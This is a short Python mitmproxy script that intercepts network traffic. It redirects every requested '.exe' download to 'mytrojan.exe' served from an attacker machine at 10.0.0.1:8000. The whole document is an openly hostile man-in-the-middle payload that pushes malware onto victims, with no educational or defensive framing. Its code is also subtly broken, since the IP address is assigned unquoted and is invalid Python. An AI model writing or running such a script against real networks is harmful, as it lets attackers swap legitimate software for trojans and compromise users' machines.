import mitmproxy
import socket

localhost = 10.0.0.1

def request(flow):
    if flow.request.host != localhost and flow.request.pretty_url.endswith(".exe"):
        flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://" + localhost + ":8000/mytrojan.exe"})